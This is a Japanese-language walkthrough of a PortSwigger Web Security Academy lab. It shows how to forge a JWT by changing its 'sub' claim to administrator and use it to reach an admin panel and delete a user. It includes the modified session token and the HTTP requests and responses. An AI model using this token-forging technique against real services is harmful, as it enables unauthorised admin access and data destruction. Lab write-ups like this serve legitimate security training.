# 未検証の署名による JWT 認証バイパス

次のハッキングラボを実施  
https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature  
このラボでは、セッションの処理に JWT ベースのメカニズムを使用します。実装上の欠陥により、サーバーは受信した JWT の署名を検証しません。

- 1. BurpSuite を起動して、proxy タブからブラウザを立ち上げます
- 2. ハッキングラボにアクセスします
- 3. 一般ユーザーでログインします
- 4. GET /my-account?id=wiener リクエストを send to repeater します
- 5. Burp Suite の拡張機能 JWT Editor を BApp Store からインストールします
- 6. repeater に送ったリクエストを GET /admin に書き換えて送信します。次のレスポンスが得られます。

```
HTTP/2 401 Unauthorized
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2614
```

- 7. Repeater の JSON Web Token タブを選択して、json の sub を wiener から administrator に変更して、COPY ボタンを押します
     ![1](https://github.com/pea-sys/web-security-experiments/assets/49807271/778df961-97cb-420b-aa30-a1114dc47b66)

- 8. リクエストのクッキーを上記のものに上書きします

```
GET /admin HTTP/2
Host: 0a76009d04beb77e85b77657008d0076.web-security-academy.net
Cookie: session=eyJraWQiOiJiZWEzYzM5Zi0yMmY1LTQyZTAtYmY5OS1kY2JkNjE1MDNjNDYiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsInN1YiI6ImFkbWluaXN0cmF0b3IiLCJleHAiOjE2OTIzNTAxODh9.tVzj-ckaW4_Dkc2O4Z4_-jOmN2NaBjf1hyDa1QU9eRw7Jx3czYCfbn3qyEND29NTEnK0TyIonnYXrYvrqhOfhrmN73bD4EYGrXzoCi4R4FqCR8mYgG7chGsup1ULkY0BPHBvue7IM5QWNPioJuaDh5-dihr5DlGTuiS_jf4zVua--EyaQGDHr2rms0YbQooODGfDIL4euA1_lZhtnnL8fTOjitpGHc4WaY20tUof3fvfYTHjXKDTGI3gXG8Q-KQ7s8fC_K98dVww5mlLYpqXw6aGpmIQWmwDgVhYPLVYFdyEGXcLjIDydPJqvWW-qW5KKgivtvMni1PwQjYGxFnBcA
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua:
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Referer: https://0a76009d04beb77e85b77657008d0076.web-security-academy.net/login
Accept-Encoding: gzip, deflate
Accept-Language: ja,en-US;q=0.9,en;q=0.8
```

管理者ページにアクセスできました。ユーザー削除リンクが得られました。

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3138
・・・
<a href="/admin/delete?username=carlos">Delete</a>
```

- 10. ユーザー削除リンクにアクセスしてユーザーを削除します

```
GET /admin/delete?username=carlos HTTP/2
```
